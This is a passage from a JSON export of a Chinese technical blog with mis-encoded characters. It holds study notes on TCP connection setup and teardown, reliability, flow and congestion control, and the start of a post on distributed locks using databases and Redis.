æ•°æ®åç§»(è¯´æ˜å¤´éƒ¨å­—èŠ‚æ˜¯20è¿˜æ˜¯åˆ°60) + ä¿ç•™ + URG(ç´§æ€¥æŒ‡é’ˆæœ‰æ•ˆ) + ACK + PSH(æ¨é€,å°½å¿«äº¤ç»™åº”ç”¨å±‚) + RST(å¤ä½,é‡æ–°å»ºç«‹è¿æ¥) + SYN(tcpå»ºç«‹æ ‡å¿—) + FIN(tcpé‡Šæ”¾æ ‡å¿—) ä¸€å…±2å­—èŠ‚,     çª—å£2å­—èŠ‚, æˆ‘çš„æ¥æ”¶çª—å£å¤§å° (ä¾‹å¦‚rwnd=20)\n\n- [x] æ£€éªŒå’Œ2å­—èŠ‚(æ£€é”™ç®—æ³•),  ç´§æ€¥æŒ‡é’ˆ2å­—èŠ‚(å¸®å¿™å–å‡ºç´§æ€¥æ•°æ®)\n\n##### 3. æœ€å¤§40å­—èŠ‚æ‰©å±•å­—æ®µ\n\n![1](tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹/4.png)\n\n\n\n# 2. tcp å»ºç«‹è¿æ¥\n\n![1](tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹/2.png)\n\n\n\n### 2.1 å®¢æˆ·ç«¯\n\n+ é¦–å…ˆå¤„äº closed çŠ¶æ€\n\n+ åˆ›å»ºä¼ è¾“æ§åˆ¶å¿«\n\n\n+ 1ï¸âƒ£ å‘é€æ¡æ‰‹â‘ SYN=1 seq=x  è¿›å…¥SYN-SENT(åŒæ­¥å·²å‘é€çŠ¶æ€)\n\n+ 3ï¸âƒ£ å‘é€æ¡æ‰‹â‘¢ACK=1 seq=x+1 ack=y+1 è¿›å…¥ ESTABLISHED(è¿æ¥å·²å»ºç«‹çŠ¶æ€)\n\n+ å¼€å§‹æ•°æ®ä¼ è¾“\n\n### 2.2 æœåŠ¡ç«¯\n\n+ é¦–å…ˆå¤„äº closed çŠ¶æ€\n\n+ åˆ›å»ºä¼ è¾“æ§åˆ¶å¿«\n\n    + tcp è¿æ¥è¡¨\n\n    + æŒ‡å‘å‘é€å’Œæ¥æ”¶ç¼“å­˜çš„æŒ‡é’ˆ\n\n    + æŒ‡å‘é‡ä¼ é˜Ÿåˆ—çš„æŒ‡é’ˆ\n\n    + å½“å‰çš„å‘é€å’Œæ¥æ”¶åºå·\n\n\n+ listen ç›‘å¬\n\n+ 2ï¸âƒ£ å‘é€æ¡æ‰‹â‘¡ SYN=1 ACK=1 seq=y ack=x+1  è¿›å…¥SYN-REVD (åŒæ­¥å·²æ¥æ”¶çŠ¶æ€)\n\n+ è¿›å…¥**ESTABLISHED**(è¿æ¥å·²å»ºç«‹çŠ¶æ€)\n\n+ å¼€å§‹æ•°æ®ä¼ è¾“\n\n# 3. tcp é‡Šæ”¾è¿æ¥\n\n![1](tcpåŸç†å’Œä¸‰æ¬¡æ¡æ‰‹å››æ¬¡æŒ¥æ‰‹/3.png)\n\n### 3.1 ä¸»åŠ¨ç«¯\n\n+ 1ï¸âƒ£ å‘é€æŒ¥æ‰‹â‘  FIN=1 ACK=1 seq=u  ack=v è¿›å…¥ **FIN_WAIT_1**(ç»ˆæ­¢ç­‰å¾…1çŠ¶æ€)\n+ æ”¶åˆ°æŒ¥æ‰‹â‘¡è¿›å…¥ **FIN_WAIT_2**(ç»ˆæ­¢ç­‰å¾…2çŠ¶æ€)\n\n+ æ¥å—æ•°æ®\n\n+ 4ï¸âƒ£ å‘é€æŒ¥æ‰‹â‘£ ACK=1 seq=u+1 ack=w+1 è¿›å…¥ **TIME_WAIT**(æ—¶é—´ç­‰å¾…çŠ¶æ€)\n\n+ ç»è¿‡2MSLå, è¿›å…¥ **CLOSED**(å…³é—­çŠ¶æ€)\n\n### 3.2 è¢«åŠ¨ç«¯\n\n+ 2ï¸âƒ£ å‘é€æŒ¥æ‰‹â‘¡ ACK=1 seq=v ack=u+1 å¹¶è¿›å…¥**CLOSE_WAIT**(å…³é—­ç­‰å¾…çŠ¶æ€)\n\n+ é€šçŸ¥åº”ç”¨è¿›ç¨‹æ–­å¼€è¿æ¥, å®¢æˆ·ç«¯åˆ°æœåŠ¡å™¨æ–¹å‘è¿æ¥å…³é—­, å±äºåŠå…³é—­çŠ¶æ€\n\n+ å‘é€æœªå‘å®Œçš„æ•°æ®\n\n+ 3ï¸âƒ£ å‘é€æŒ¥æ‰‹â‘¢ FIN=1 ACK=1 seq=w ack=u+1 è¿›å…¥ **LAST-ACK**(æœ€åç¡®è®¤çŠ¶æ€)\n\n+ æ”¶åˆ°æŒ¥æ‰‹â‘£åè¿›å…¥ **CLOSED**(å…³é—­çŠ¶æ€)\n\n\n\n# 4. tcp å¯é æ€§\n\n### 4.1 å¦‚ä½•ä¿è¯å¯é æ€§\n\n1. **åŸºäºæ•°æ®å—ä¼ è¾“**ï¼šåº”ç”¨æ•°æ®è¢«åˆ†å‰²æˆ TCP è®¤ä¸ºæœ€é€‚åˆå‘é€çš„æ•°æ®å—ï¼Œå†ä¼ è¾“ç»™ç½‘ç»œå±‚ï¼Œæ•°æ®å—è¢«ç§°ä¸ºæŠ¥æ–‡æ®µæˆ–æ®µã€‚\n2. **å¯¹å¤±åºæ•°æ®åŒ…é‡æ–°æ’åºä»¥åŠå»é‡**ï¼šTCP ä¸ºäº†ä¿è¯ä¸å‘ç”Ÿä¸¢åŒ…ï¼Œå°±ç»™æ¯ä¸ªåŒ…ä¸€ä¸ªåºåˆ—å·ï¼Œæœ‰äº†åºåˆ—å·èƒ½å¤Ÿå°†æ¥æ”¶åˆ°çš„æ•°æ®æ ¹æ®åºåˆ—å·æ’åºï¼Œå¹¶ä¸”å»æ‰é‡å¤åºåˆ—å·çš„æ•°æ®å°±å¯ä»¥å®ç°æ•°æ®åŒ…å»é‡ã€‚\n3. **æ ¡éªŒå’Œ** : TCP å°†ä¿æŒå®ƒé¦–éƒ¨å’Œæ•°æ®çš„æ£€éªŒå’Œã€‚è¿™æ˜¯ä¸€ä¸ªç«¯åˆ°ç«¯çš„æ£€éªŒå’Œï¼Œç›®çš„æ˜¯æ£€æµ‹æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­çš„ä»»ä½•å˜åŒ–ã€‚å¦‚æœæ”¶åˆ°æ®µçš„æ£€éªŒå’Œæœ‰å·®é”™ï¼ŒTCP å°†ä¸¢å¼ƒè¿™ä¸ªæŠ¥æ–‡æ®µå’Œä¸ç¡®è®¤æ”¶åˆ°æ­¤æŠ¥æ–‡æ®µã€‚\n4. **è¶…æ—¶é‡ä¼ ** : å½“å‘é€æ–¹å‘é€æ•°æ®ä¹‹åï¼Œå®ƒå¯åŠ¨ä¸€ä¸ªå®šæ—¶å™¨ï¼Œç­‰å¾…ç›®çš„ç«¯ç¡®è®¤æ”¶åˆ°è¿™ä¸ªæŠ¥æ–‡æ®µã€‚æ¥æ”¶ç«¯å®ä½“å¯¹å·²æˆåŠŸæ”¶åˆ°çš„åŒ…å‘å›ä¸€ä¸ªç›¸åº”çš„ç¡®è®¤ä¿¡æ¯ï¼ˆACKï¼‰ã€‚å¦‚æœå‘é€ç«¯å®ä½“åœ¨åˆç†çš„å¾€è¿”æ—¶å»¶ï¼ˆRTTï¼‰å†…æœªæ”¶åˆ°ç¡®è®¤æ¶ˆæ¯ï¼Œé‚£ä¹ˆå¯¹åº”çš„æ•°æ®åŒ…å°±è¢«å‡è®¾ä¸º[å·²ä¸¢å¤±](https://zh.wikipedia.org/wiki/ä¸¢åŒ…)å¹¶è¿›è¡Œé‡ä¼ ã€‚\n5. **æµé‡æ§åˆ¶** : TCP è¿æ¥çš„æ¯ä¸€æ–¹éƒ½æœ‰å›ºå®šå¤§å°çš„ç¼“å†²ç©ºé—´ï¼ŒTCP çš„æ¥æ”¶ç«¯åªå…è®¸å‘é€ç«¯å‘é€æ¥æ”¶ç«¯ç¼“å†²åŒºèƒ½æ¥çº³çš„æ•°æ®ã€‚å½“æ¥æ”¶æ–¹æ¥ä¸åŠå¤„ç†å‘é€æ–¹çš„æ•°æ®ï¼Œèƒ½æç¤ºå‘é€æ–¹é™ä½å‘é€çš„é€Ÿç‡ï¼Œé˜²æ­¢åŒ…ä¸¢å¤±ã€‚TCP ä½¿ç”¨çš„æµé‡æ§åˆ¶åè®®æ˜¯å¯å˜å¤§å°çš„æ»‘åŠ¨çª—å£åè®®ï¼ˆTCP åˆ©ç”¨æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶ï¼‰ã€‚\n6. **æ‹¥å¡æ§åˆ¶** : å½“ç½‘ç»œæ‹¥å¡æ—¶ï¼Œå‡å°‘æ•°æ®çš„å‘é€ã€‚\n\n### 4.2 ä¸ºä»€ä¹ˆä¸ä¸¤æ¬¡æ¡æ‰‹\n\nå‡å¦‚ç¬¬ä¸€ä¸ªè¿æ¥å‘é€å¤±è´¥ï¼Œé‡ä¼ åè¿‡äº†å¥½ä¹…å¥½ä¹…ï¼Œåˆ°è¾¾äº†ã€‚ \n\næœåŠ¡å™¨å¯¹å¤±è´¥åçš„è¿æ¥åˆå»ºç«‹äº†ä¸€æ¬¡è¯·æ±‚ï¼Œ ä½†å®¢æˆ·ç«¯å¯èƒ½å¤„äºå…³é—­äº†éƒ½æ— æ³•ç†ä¼šï¼ŒæœåŠ¡å™¨å°±æ— æ³•é‡Šæ”¾è¿™ä¸ªè¿æ¥ã€‚\n\n### 4.3 ä¸ºä»€ä¹ˆ TIME_WAIT\n\nå‚è€ƒï¼šhttps://www.liuvv.com/p/7b71ec65.html\n\nå› ä¸ºå®¢æˆ·ç«¯å‘é€æŒ¥æ‰‹â‘£çš„æ—¶å€™ï¼Œæœ‰å¯èƒ½å¤±è´¥ã€‚\n\nå¦‚æœå®¢æˆ·ç«¯ç›´æ¥å…³é—­ï¼ŒæœåŠ¡å™¨é‡å‘æŒ¥æ‰‹â‘¢ï¼Œå®¢æˆ·ç«¯å¤„äºå…³é—­ä¸å“åº”ï¼ŒæœåŠ¡å™¨æ— æ³•é‡Šæ”¾èµ„æºã€‚\n\n\n### 4.4 ä¿æ´»è®¡æ—¶å™¨\n\nå‡å¦‚å»ºç«‹è¿æ¥å, å®¢æˆ·ç«¯å‡ºç°äº†æ•…éšœ\n\n+ æœåŠ¡å™¨æ¯æ¬¡æ”¶åˆ°è¯·æ±‚åï¼Œ é‡æ–°å¯åŠ¨å®šæ—¶å™¨(2å°æ—¶)ã€‚\n+ æœåŠ¡å™¨2å°æ—¶åæ²¡æ”¶åˆ°å®¢æˆ·ç«¯è¯·æ±‚ï¼Œå‘é€æ¢æµ‹æŠ¥æ–‡æ®µã€‚\n+ æœåŠ¡å™¨75ç§’é—´éš”å‘é€ä¸€ä¸ªï¼Œè¾¾åˆ°10ä¸ªæ— å“åº”ï¼Œå…³é—­è¿æ¥ã€‚\n\n### 4.5 æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶\n\nå‚è€ƒï¼šhttps://www.liuvv.com/p/7eb83068.html\n\n# 5. å¤´è„‘é£æš´\n\n- socket è¿‡ç¨‹ï¼šæœåŠ¡å™¨ bind+listen+for(accept)ï¼Œå®¢æˆ·ç«¯ connectï¼Œç›¸äº’ read+writeã€‚\n- ä¸‰æ¬¡æ¡æ‰‹ï¼šSYN+ åºåˆ—å·ï¼ŒSYN+ACK+ åºåˆ—å·å¢åŠ ï¼ŒACK+ åºåˆ—å·å¢åŠ ï¼Œæœ€åè¿›å…¥ ESTABLISHEDã€‚\n- å››æ¬¡æŒ¥æ‰‹ï¼šå®¢æˆ·ç«¯ FINï¼ŒæœåŠ¡å™¨ ACK è¿›å…¥ CLOSE_WAITï¼ŒæœåŠ¡å™¨ç»§ç»­å‘æ¶ˆæ¯ï¼ŒæœåŠ¡å™¨ FINï¼Œå®¢æˆ·ç«¯ ACK è¿›å…¥ TIME_WAITã€‚\n- TIME_WAIT: åªæ˜¯ä¸»åŠ¨ç«¯ç‰¹æœ‰çš„çŠ¶æ€ã€‚å¦‚æœä¸ç­‰å¾…ç›´æ¥closeï¼Œä¸‡ä¸€ç¬¬å››æ¬¡æŒ¥æ‰‹å¤±è´¥ï¼ŒæœåŠ¡å™¨é‡å‘å¾—ä¸åˆ°å“åº”ï¼Œæ— æ³•é‡Šæ”¾ã€‚\n\n# 6. å‚è€ƒèµ„æ–™\n\n+ https://my.oschina.net/xinxingegeya/blog/485643\n+ https://blog.oldboyedu.com/tcp-wait/","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"tcpæµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶çš„çª—å£","url":"%2Fp%2F7eb83068.html","content":"\n# 1. æµé‡æ§åˆ¶ï¼ˆæ»‘åŠ¨çª—å£ï¼‰\n\nTCP åˆ©ç”¨æ»‘åŠ¨çª—å£å®ç°æµé‡æ§åˆ¶ã€‚æµé‡æ§åˆ¶æ˜¯ä¸ºäº†æ§åˆ¶å‘é€æ–¹å‘é€é€Ÿç‡ï¼Œä¿è¯æ¥æ”¶æ–¹æ¥å¾—åŠæ¥æ”¶ã€‚ æ¥æ”¶æ–¹å‘é€çš„ç¡®è®¤æŠ¥æ–‡ä¸­çš„çª—å£å­—æ®µå¯ä»¥ç”¨æ¥æ§åˆ¶å‘é€æ–¹çª—å£å¤§å°ï¼Œä»è€Œå½±å“å‘é€æ–¹çš„å‘é€é€Ÿç‡ã€‚å°†çª—å£å­—æ®µè®¾ç½®ä¸º 0ï¼Œåˆ™å‘é€æ–¹ä¸èƒ½å‘é€æ•°æ®ã€‚\n\nå‘é€ç«¯å’Œæ¥æ”¶ç«¯å„è‡ªæœ‰è‡ªå·±çš„æ»‘åŠ¨çª—å£ã€‚\n\n<!-- more -->\n\n### 1.1 æ»‘åŠ¨çª—å£\n\n##### å‘é€çª—å£\n\n1. å·²ç»å‘é€å¹¶ä¸”ç¡®è®¤çš„ TCP æ®µï¼ˆå·²ç»å‘é€å¹¶ç¡®è®¤ï¼‰ï¼›\n2. å·²ç»å‘é€ä½†æ˜¯æ²¡æœ‰ç¡®è®¤çš„ TCP æ®µï¼ˆå·²ç»å‘é€æœªç¡®è®¤ï¼‰ï¼›\n3. æœªå‘é€ä½†æ˜¯æ¥æ”¶æ–¹å‡†å¤‡æ¥æ”¶çš„ TCP æ®µï¼ˆå¯ä»¥å‘é€ï¼‰ï¼›\n4. æœªå‘é€å¹¶ä¸”æ¥æ”¶æ–¹ä¹Ÿå¹¶æœªå‡†å¤‡æ¥å—çš„ TCP æ®µï¼ˆä¸å¯å‘é€ï¼‰ã€‚\n\n<img src=\"tcpæµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶çš„çª—å£/1.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n##### æ¥æ”¶çª—å£\n\n1. å·²ç»æ¥æ”¶å¹¶ä¸”å·²ç»ç¡®è®¤çš„ TCP æ®µï¼ˆå·²ç»æ¥æ”¶å¹¶ç¡®è®¤ï¼‰ï¼›\n2. ç­‰å¾…æ¥æ”¶ä¸”å…è®¸å‘é€æ–¹å‘é€ TCP æ®µï¼ˆå¯ä»¥æ¥æ”¶æœªç¡®è®¤ï¼‰ï¼›\n3. ä¸å¯æ¥æ”¶ä¸”ä¸å…è®¸å‘é€æ–¹å‘é€ TCP æ®µï¼ˆä¸å¯æ¥æ”¶ï¼‰ã€‚\n\n<img src=\"tcpæµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶çš„çª—å£/2.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n### 1.2 æ»‘åŠ¨æµç¨‹\n\n+ Bå‘Šè¯‰Açš„çª—å£å¤§å°ï¼Œrwnd=20  æˆ‘çš„çª—å£å¤§å°20ã€‚ack=31  ä¸‹ä¸€æ¬¡ç»™è€å­å‘31ã€‚\n\n+ B çª—å£å†…ï¼Œæ•°æ®æœªæŒ‰åºåˆ°è¾¾ï¼Œåªèƒ½ç°åœ¨ç¼“å­˜ä¸­ã€‚å› ä¸º B åªèƒ½æŒ‰æ­£ç¡®é¡ºåºå‘é€ACKã€‚\n+ å¦‚æœ A ä¸€ç›´æ²¡æœ‰æ”¶åˆ° ACKï¼Œè¿˜æœ‰è¶…æ—¶é‡ä¼ æœºåˆ¶ã€‚\n\n##### æ³¨æ„ç‚¹\n\n+ å› ä¸ºæ˜¯å…¨åŒå·¥é€šä¿¡ï¼Œå‘é€ç«¯å’Œæ¥æ”¶ç«¯éƒ½æœ‰è‡ªå·±çš„å‘é€çª—å£å’Œæ¥æ”¶çª—å£ã€‚\n+ Açš„çª—å£å¤§å°ä¸ä¸€å®šå’Œ B çš„ä¸€æ ·ã€‚\n+ B çš„ä¸æŒ‰æ—¶åºè¾¾åˆ°çš„æ•°æ®å¦‚ä½•å¤„ç†ï¼Œ tcp æ²¡æœ‰è§„å®šã€‚1ï¼šç›´æ¥ä¸¢å¼ƒ, ç®€å•, æ•ˆç‡å·® 2ï¼šç¼“å­˜åœ¨çª—å£å†…, ç­‰åˆ°æ”¶åˆ°è¿ç»­äº†å, å† ACKã€‚\n+ ä¸ºäº†å¢åŠ æ•ˆç‡,  tcp è¦æ±‚æ¥æ”¶æ–¹ B ã€‚1ï¼šç´¯è®¡ç¡®è®¤ï¼Œå¤šä¸ªä¸€èµ·ç¡®è®¤ã€‚ 2ï¼šæå¸¦ç¡®è®¤ï¼Œå‘æ•°æ®é¡ºä¾¿ç¡®è®¤ï¼Œä¸ç»å¸¸å‘ç”Ÿ 3ï¼šä¸èƒ½å¤ªæ™šç¡®è®¤, è¦ä¸ç„¶ A å°±è¶…æ—¶é‡ä¼ ã€‚\n+ é›¶çª—å£æ£€æµ‹ã€‚æ»‘åŠ¨çª—å£æ²¡æœ‰ç¼“å­˜äº†ï¼Œ ä¹Ÿå¿…é¡»è¦æ¥æ”¶æ£€æµ‹æˆ–ç´§æ€¥æŠ¥æ–‡ã€‚\n\n<img src=\"tcpæµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶çš„çª—å£/4.png\" alt=\"1\" style=\"zoom: 67%;\" />\n\n\n\n# 2. æ‹¥å¡æœºåˆ¶ï¼ˆå››ä¸ªç®—æ³•æ§åˆ¶æ‹¥å¡çª—å£ï¼‰\n\næ‹¥å¡æ§åˆ¶å°±æ˜¯ä¸ºäº†é˜²æ­¢è¿‡å¤šçš„æ•°æ®æ³¨å…¥åˆ°ç½‘ç»œä¸­ï¼Œè¿™æ ·å°±å¯ä»¥ä½¿ç½‘ç»œä¸­çš„è·¯ç”±å™¨æˆ–é“¾è·¯ä¸è‡´è¿‡è½½ã€‚æµé‡æ§åˆ¶å¾€å¾€æ˜¯ç‚¹å¯¹ç‚¹é€šä¿¡é‡çš„æ§åˆ¶ï¼Œæ˜¯ä¸ªç«¯åˆ°ç«¯çš„é—®é¢˜ã€‚æµé‡æ§åˆ¶æ‰€è¦åšåˆ°çš„å°±æ˜¯æŠ‘åˆ¶å‘é€ç«¯å‘é€æ•°æ®çš„é€Ÿç‡ï¼Œä»¥ä¾¿ä½¿æ¥æ”¶ç«¯æ¥å¾—åŠæ¥æ”¶ã€‚\n\nä¸ºäº†è¿›è¡Œæ‹¥å¡æ§åˆ¶ï¼ŒTCP å‘é€æ–¹è¦ç»´æŒä¸€ä¸ª æ‹¥å¡çª—å£(cwnd) çš„çŠ¶æ€å˜é‡ã€‚æ‹¥å¡æ§åˆ¶çª—å£çš„å¤§å°å–å†³äºç½‘ç»œçš„æ‹¥å¡ç¨‹åº¦ï¼Œå¹¶ä¸”åŠ¨æ€å˜åŒ–ã€‚å‘é€æ–¹è®©è‡ªå·±çš„å‘é€çª—å£å–ä¸ºæ‹¥å¡çª—å£å’Œæ¥æ”¶æ–¹çš„æ¥å—çª—å£ä¸­è¾ƒå°çš„ä¸€ä¸ªã€‚\n\nTCP å‘é€æ–¹Açš„å‘é€çª—å£ = min (Açš„è‡ªèº«æ‹¥å¡çª—å£ï¼ŒTCPæ¥æ”¶æ–¹Bçš„æ¥æ”¶çª—å£)\n\n### 2.1 å››ä¸ªç®—æ³•\n\n##### 1. æ…¢å¼€å§‹ç®—æ³• ï¼ˆäºŒå€å¢åŠ ï¼‰\n\nå‘é€çš„æŠ¥æ–‡å°‘ã€‚è™½ç„¶åå­—å«åšæ…¢å¼€å§‹ï¼Œä½†æ˜¯å¢é•¿çš„é€Ÿåº¦éå¸¸å¿«ã€‚\n\n##### 2. æ‹¥å¡é¿å…ç®—æ³•ï¼ˆæ¯æ¬¡+1ï¼‰\n\næ˜¯çº¿æ€§å¢é•¿ï¼Œè¯•è¯•å•¥æ—¶å€™æ‹¥å¡ï¼Œå°è¯•æ‹¥å¡çš„åº•çº¿ã€‚\n\n##### 3. å¿«é‡ä¼ ç®—æ³•\n\nB æ•°æ®æœªæŒ‰åºåˆ°è¾¾ï¼Œå°±ä¸€ç›´å‘é€æƒ³è¦çš„åºå·ï¼Œä¸€ç›´æé†’ Aè®©ææ—©é‡ä¼ ã€‚\n\n+ Bè¦æ±‚ A ä½ å¿«é‡ä¼ , ä¸è¦ç­‰è®¡æ—¶å™¨åˆ°äº†\n+ Bç«‹å³å‘é€ç¡®è®¤, å¦‚æœä¸æ˜¯æ­£ç¡®é¡ºåºåˆ°è¾¾, å°±å‘é€ä¹‹å‰æ­£ç¡®é¡ºåºçš„é‡å¤ç¡®è®¤(ä¸ºäº†æé†’ A)\n+ A æ”¶åˆ°äº†3ä¸ªè¿ç»­çš„é‡å¤ç¡®è®¤, å°±åº”è¯¥ç«‹å³é‡ä¼ \n\n##### 4. å¿«æ¢å¤ç®—æ³•\n\n+ å°†ssthreshå’Œ cwndéƒ½è°ƒæ•´ä¸ºå½“å‰çª—å£çš„ä¸€åŠï¼Œä»–ä¿©ç›¸ç­‰äº†å†æ‰§è¡Œæ‹¥å¡é¿å…ç®—æ³•ã€‚\n\n### 2.2 æ‹¥å¡çª—å£å˜åŒ–æµç¨‹\n\n<img src=\"tcpæµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶çš„çª—å£/3.png\" alt=\"1\" style=\"zoom:67%;\" />\n\n1. é¦–å…ˆç¡®è®¤æ‹¥å¡çª—å£å¤§å° cwndï¼Œå’Œä¸€ä¸ª æ…¢å¼€å§‹å˜é‡ ssthreshã€‚\n2. å‡è®¾åˆšå¼€å§‹ cwnd=1ï¼Œssthresh=16ã€‚\n3. cwnd < ssthresh èµ°æ…¢å¼€å§‹ç®—æ³•ï¼Œæ¯æ¬¡æ”¶åˆ° ack, å°±+1,  ç„¶å +2,  + 4,  + 8 , æœ‰ç§æŒ‡æ•°å¢é•¿æ¦‚å¿µã€‚\n4. cwnd >  ssthreshï¼Œcwnd cè¶…è¿‡äº†16ï¼Œèµ°æ‹¥å¡é¿å…ç®—æ³•ã€‚ æ¯æ¬¡+1ï¼Œ æ”¶åˆ°åå†+1ã€‚\n5. cwnd = 24 çš„æ—¶å€™ï¼Œçªç„¶å‡ºç°äº†ä¸¢åŒ…æƒ…å†µï¼Œè®¤ä¸ºæ‹¥å¡ã€‚\n6. å°† ssthresh=cwnd/2 ï¼ˆ12ï¼‰ï¼Œcwnd=1ã€‚\n7. æ…¢å¼€å§‹ç®—æ³•ç»§ç»­å¼€å§‹ï¼Œå‘¨è€Œå¤å§‹ã€‚\n\n### 2.3 å¿«é‡ä¼ å’Œå¿«é‡å¤\n\næœ‰æ—¶å€™ä¸¢åŒ…æ˜¯ç½‘ç»œé—®é¢˜ï¼Œå¹¶ä¸æ˜¯æ‹¥å¡ã€‚ä½†æ˜¯ä½ è®¤ä¸ºæ‹¥å¡ï¼Œç›´æ¥è®©çª—å£å˜1äº†æ€ä¹ˆåŠ? ä½¿ç”¨å¿«é‡ä¼ å’Œå¿«æ¢å¤ç®—æ³•ï¼Œé¿å…æ‹¥å¡çª—å£ç›´æ¥å˜1ã€‚\n\n+ å¿«é‡ä¼ \n\n1. å¯ç”¨å¿«é‡ä¼ æœºåˆ¶ã€‚\n\n2. B ç›´æ¥ç»™ A å‘é€3ä¸ªé‡å¤ç¡®è®¤ã€‚\n\n3. å‘é€æ–¹ A æ”¶åˆ°äº†3ä¸ªé‡å¤ç¡®è®¤, è¯´æ˜ä¸æ˜¯æ‹¥å¡, ä¸ç”¨æ…¢å¼€å§‹ç®—æ³•, æ‰§è¡Œå¿«æ¢å¤ç®—æ³•ã€‚\n\n+ å¿«æ¢å¤\n\n1. å¿«æ¢å¤ç®—æ³•ï¼Œç›´æ¥å°†æ‹¥å¡çª—å£å’Œssthreshç­‰äºå½“å‰çš„æ‹¥å¡çª—å£çš„ä¸€åŠã€‚\n\n2. å› ä¸ºç›¸ç­‰ï¼Œç»§ç»­æ‰§è¡Œæ‹¥å¡é¿å…æ–¹æ³•ã€‚\n\n# 3. å¤´è„‘é£æš´\n\n+ æµç¨‹æ§åˆ¶çš„æ˜¯æ»‘åŠ¨çª—å£ï¼Œæ‹¥å¡æ§åˆ¶çš„æ˜¯æ‹¥å¡çª—å£ã€‚\n+ åˆ¤æ–­æ‹¥å¡ä¾æ®ï¼Œæ˜¯ A æ²¡æœ‰æ”¶åˆ° B çš„ ACKï¼Œ Aè‡ªå·±å‘ç”Ÿäº†è¶…æ—¶é‡ä¼ ã€‚\n+ æ‹¥å¡æ§åˆ¶ä¸€å…±æœ‰4ä¸ªç®—æ³•ï¼Œæ…¢å¼€å§‹ï¼Œæ‹¥å¡é¿å…ï¼Œå¿«é‡ä¼ ï¼Œå¿«æ¢å¤ã€‚","tags":["tcp"],"categories":["ç½‘ç»œ"]},{"title":"åˆ†å¸ƒå¼é”çš„ä¸åŒå®ç°","url":"%2Fp%2F4eb3381c.html","content":"\nåˆ†å¸ƒå¼é”å…¶å®å°±æ˜¯ï¼Œæ§åˆ¶åˆ†å¸ƒå¼ç³»ç»Ÿä¸åŒè¿›ç¨‹å…±åŒè®¿é—®å…±äº«èµ„æºçš„ä¸€ç§é”çš„å®ç°ã€‚å¦‚æœä¸åŒçš„ç³»ç»Ÿæˆ–åŒä¸€ä¸ªç³»ç»Ÿçš„ä¸åŒä¸»æœºä¹‹é—´å…±äº«äº†æŸä¸ªä¸´ç•Œèµ„æºï¼Œå¾€å¾€éœ€è¦äº’æ–¥æ¥é˜²æ­¢å½¼æ­¤å¹²æ‰°ï¼Œä»¥ä¿è¯ä¸€è‡´æ€§ã€‚\n\nä¸šç•Œæµè¡Œçš„åˆ†å¸ƒå¼é”å®ç°ï¼Œä¸€èˆ¬åŸºäºæ•°æ®åº“ï¼ŒRediså’ŒZookeeperã€‚\n\n<!-- more -->\n\n# 1. æ•°æ®åº“\n\n### 1.1 åŸºäºæ‚²è§‚é”\n\n1. åœ¨å¯¹ä»»æ„è®°å½•è¿›è¡Œä¿®æ”¹å‰ï¼Œå…ˆå°è¯•ä¸ºè¯¥è®°å½•åŠ ä¸Šæ’ä»–é”ï¼ˆexclusive lockingï¼‰ã€‚\n2. å¦‚æœåŠ é”å¤±è´¥ï¼Œè¯´æ˜è¯¥è®°å½•æ­£åœ¨è¢«ä¿®æ”¹ï¼Œé‚£ä¹ˆå½“å‰æŸ¥è¯¢å¯èƒ½è¦ç­‰å¾…æˆ–è€…æŠ›å‡ºå¼‚å¸¸ã€‚ å…·ä½“å“åº”æ–¹å¼ç”±å¼€å‘è€…æ ¹æ®å®é™…éœ€è¦å†³å®šã€‚\n3. å¦‚æœæˆåŠŸåŠ é”ï¼Œé‚£ä¹ˆå°±å¯ä»¥å¯¹è®°å½•åšä¿®æ”¹ï¼Œäº‹åŠ¡å®Œæˆåå°±ä¼šè§£é”äº†ã€‚\n4. å…¶é—´å¦‚æœæœ‰å…¶ä»–å¯¹è¯¥è®°å½•åšä¿®æ”¹æˆ–åŠ æ’ä»–é”çš„æ“ä½œï¼Œéƒ½ä¼šç­‰å¾…æˆ‘ä»¬è§£é”æˆ–ç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚\n\n\n\n+ select for updateï¼Œæ‹¿åˆ°é”ã€‚\n+ å…¶ä»–äº‹åŠ¡æŠ¢é”ä¼šé˜»å¡ã€‚\n+ æ‹¿åˆ°é”ä»¥åï¼Œé€šè¿‡ commit é‡Šæ”¾é”ã€‚\n\n### 1.2 åŸºäºä¹è§‚é”\n\nä½¿ç”¨ç‰ˆæœ¬å·æ—¶ï¼Œå¯ä»¥åœ¨æ•°æ®åˆå§‹åŒ–æ—¶æŒ‡å®šä¸€ä¸ªç‰ˆæœ¬å·ï¼Œæ¯æ¬¡å¯¹æ•°æ®çš„æ›´æ–°æ“ä½œéƒ½å¯¹ç‰ˆæœ¬å·æ‰§è¡Œ+1æ“ä½œã€‚å¹¶åˆ¤æ–­å½“å‰ç‰ˆæœ¬å·æ˜¯ä¸æ˜¯è¯¥æ•°æ®çš„æœ€æ–°çš„ç‰ˆæœ¬å·ã€‚\n\n\n\nå‚è€ƒï¼š https://zhuanlan.zhihu.com/p/524143305\n\n# 2. redis\n\n1. SETNX + expire å‡½æ•°è§£å†³ï¼Œ2ä¸ªå‡½æ•°æ²¡æœ‰è¾¾åˆ°åŸå­æ€§ã€‚\n\n2. SET NX PXï¼Œä¸€ä¸ªå‡½æ•°æå®šã€‚ä½†æ˜¯è¿‡æœŸäº†å¯ä»¥é‡Šæ”¾åˆ«äººçš„é”ã€‚\n\n3. é€šè¿‡UUID åˆ¤æ–­ï¼Œåªèƒ½é‡Šæ”¾è‡ªå·±çš„é”ï¼Œè¿™ä¸ªæ—¶å€™è¦é€šè¿‡ lua è„šæœ¬ã€‚\n\n4. 